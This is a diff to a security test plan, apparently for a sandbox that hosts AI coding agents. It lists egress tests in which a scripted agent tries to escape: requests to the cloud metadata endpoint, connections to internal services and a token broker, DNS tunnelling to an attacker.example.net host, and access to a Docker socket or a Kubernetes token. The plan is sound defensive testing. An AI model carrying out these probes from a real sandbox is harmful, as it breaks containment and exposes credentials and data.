@@ -487,14 +487,17 @@ All run with the shim's `script` backend making the "agent" perform the attack (
 
 | ID | Attempt from inside the sandbox | Expected |
 |---|---|---|
-| SEC-EGRESS-01 | `curl https://example.com` directly and via `HTTPS_PROXY` | DNS NXDOMAIN; proxy 403 |
+| SEC-EGRESS-01 | `curl https://example.com` directly and through sbx-edge with SNI `example.com`; no proxy variables (SIMPLIFY-D30) | name does not resolve; sbx-edge closes the session |
 | SEC-EGRESS-02 | `curl http://169.254.169.254/latest/meta-data/` | no route |
 | SEC-EGRESS-03 | connect to `runner-local:8480`, `postgres-replicant:5432`, `temporal:7233`, `github-token-broker:8080`, `control-plane-api:8401` by name and by IP | NXDOMAIN by name; no route by IP (different network) |
-| SEC-EGRESS-04 | push to `git.sbx.local` (`git push`) | 403 (upload-pack only); no credentials present |
+| SEC-EGRESS-04 | `git push` from the sandbox; resolve `git.sbx.local` | no remote and no git endpoint (the repo arrives as a bundle, SIMPLIFY-D40); the name does not resolve; no credentials present |
 | SEC-EGRESS-05 | DNS tunnelling (`dig TXT x.attacker.example.net`, `nslookup` to 8.8.8.8) | NXDOMAIN / no route |
 | SEC-EGRESS-06 | `npm install left-pad` / `go get` / `pip install` via mirrors | succeed (allowed path works) |
 | SEC-EGRESS-07 | Docker socket (`/var/run/docker.sock`) or Kubernetes SA token present | absent |
 | SEC-EGRESS-08 | read another run's S3 prefix with vended credentials | 403 |
+| SEC-EGRESS-09 | resolve names outside the sandbox host map (`github.com`, `registry.npmjs.org`, `api.anthropic.com`, …) and the `*.sbx.local` / allowlisted names (SIMPLIFY-D30) | others do not resolve; the mapped names all resolve to sbx-edge |
+| SEC-EGRESS-10 | TLS through sbx-edge with a non-allowlisted SNI (`github.com`, `api.anthropic.com`), with no SNI, and plain HTTP to an allowlisted name | closed / refused (444) |
+| SEC-EGRESS-11 | TCP to public IPs (`1.1.1.1:443`, `8.8.8.8:443`, …) | no route |
 | SEC-EGRESS-06b | request 1,000 nonexistent npm package names from one run (WS-09 RT-10) | mirror rate limit trips; alert `replicant_mirror_unknown_package_burst` |
 
 ### 8.2 Prompt-injection fixtures
